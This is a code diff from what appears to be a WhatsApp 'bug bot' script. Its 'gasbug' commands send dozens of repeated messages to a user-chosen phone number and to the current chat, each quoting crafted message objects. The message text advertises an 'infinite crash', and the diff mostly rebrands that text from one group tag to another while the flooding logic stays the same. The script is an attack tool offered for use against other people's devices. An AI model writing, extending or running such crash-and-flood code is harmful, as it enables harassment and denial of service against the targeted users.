-"caption": `𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
  'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc1})
 await m.reply(`Succes`)
 break
 case 'gasbug10':
@@ -6673,66 +6166,36 @@ let stic1 = {
 "messageTimestamp": "1614070775",
 "status": "PENDING"
  }
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic1})
